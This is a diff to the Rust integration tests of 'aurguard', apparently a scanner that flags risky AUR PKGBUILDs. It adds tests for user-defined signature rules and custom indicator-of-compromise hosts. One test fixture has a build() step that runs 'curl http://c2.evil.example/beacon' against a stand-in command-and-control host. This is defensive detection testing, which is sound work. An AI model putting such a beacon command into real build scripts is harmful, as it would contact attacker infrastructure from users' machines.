@@ -1,7 +1,7 @@
 //! Integration tests exercising the analyzer end-to-end through the public
 //! library API, against realistic PKGBUILD fixtures.
 
-use aurguard::config::Config;
+use aurguard::config::{Config, CustomRule};
 use aurguard::diff::Approval;
 use aurguard::i18n::Lang;
 use aurguard::pkgbuild::{analyze, analyze_with, PkgSources, ScanOpts};
@@ -513,6 +513,7 @@ fn delta_flags_new_risk_on_version_bump() {
         first_submitted: 1_600_000_000,
         last_modified: 1_700_000_000,
         num_votes: 50,
+        out_of_date: None,
         url_path: None,
     };
     // Prior approval: older version, EVAL not among approved codes, different
@@ -593,6 +594,57 @@ fn missing_validpgpkeys_is_flagged() {
     assert!(
         codes(&report).contains(&"MISSING_PGP"),
         "got {:?}",
+        codes(&report)
+    );
+}
+
+/// A user-defined `[signatures]` rule fires alongside the built-ins.
+#[test]
+fn custom_signature_rule_fires() {
+    let mut cfg = Config::default();
+    cfg.signatures.custom.push(CustomRule {
+        code: "INTERNAL_MIRROR".into(),
+        severity: Some("critical".into()),
+        message: Some("retired internal mirror".into()),
+        contains: vec!["old-mirror.corp".into(), "curl".into()],
+        not: vec![],
+    });
+    let pkgbuild = "build() {\n  curl http://old-mirror.corp/x.tar.gz\n}\n";
+    let report = analyze_with(
+        None,
+        &PkgSources::from_pkgbuild(pkgbuild),
+        &cfg,
+        None,
+        now(),
+        ScanOpts::default(),
+    );
+    assert!(
+        report
+            .findings
+            .iter()
+            .any(|f| f.code == "CUSTOM_RULE" && f.arg.as_deref() == Some("INTERNAL_MIRROR")),
+        "{:?}",
+        codes(&report)
+    );
+}
+
+/// A user-defined `[ioc].hosts` entry is matched like the built-in blocklist.
+#[test]
+fn custom_ioc_host_fires() {
+    let mut cfg = Config::default();
+    cfg.ioc.hosts.push("c2.evil.example".into());
+    let pkgbuild = "build() {\n  curl http://c2.evil.example/beacon\n}\n";
+    let report = analyze_with(
+        None,
+        &PkgSources::from_pkgbuild(pkgbuild),
+        &cfg,
+        None,
+        now(),
+        ScanOpts::default(),
+    );
+    assert!(
+        codes(&report).contains(&"IOC_MATCH"),
+        "{:?}",
         codes(&report)
     );
 }
